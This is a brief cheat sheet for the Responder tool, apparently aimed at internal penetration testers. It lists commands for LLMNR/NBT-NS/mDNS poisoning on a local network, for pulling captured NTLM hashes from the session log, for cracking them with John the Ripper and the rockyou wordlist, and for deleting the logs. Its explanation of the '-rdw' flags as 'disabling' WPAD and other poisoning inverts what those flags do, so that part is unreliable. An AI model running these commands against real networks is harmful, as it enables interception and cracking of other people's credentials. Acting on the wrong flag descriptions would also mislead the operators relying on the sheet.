Responder is a powerful tool for performing **LLMNR, NBT-NS, and MDNS poisoning** to intercept and capture authentication hashes on a local network. It is commonly used in internal network penetration testing to identify misconfigurations and weak authentication mechanisms.

## Basic Usage

```
sudo responder -I eth0
```

- `-I eth0` → Specifies the network interface to listen on.


## listening on multiple interfaces

```
sudo responder -I eth0,wlan0
```

- Enables Responder to capture hashes from multiple network interfaces simultaneously.
## analyzing captured hashes

```
cat /var/log/responder/Responder-Session.log | grep -i ntlm
```

- Extracts NTLM hashes from captured logs for further analysis.
## cracking captured hashes with john the ripper

```
john --wordlist=/usr/share/wordlists/rockyou.txt /var/log/responder/Responder-Session.log
```

- Uses **John the Ripper** to crack NTLM hashes with the **rockyou** wordlist.
## disabling specific poisoning attacks

```
sudo responder -I eth0 -rdw
```

- `-r` → Disables NetBIOS relay poisoning.
- `-d` → Disables fingerprinting of responding hosts.
- `-w` → Disables WPAD (Web Proxy Auto-Discovery) poisoning.
## clearing logs before starting a new session

```
sudo rm -rf /var/log/responder/*
```

- Ensures old logs are removed before starting a fresh Responder session.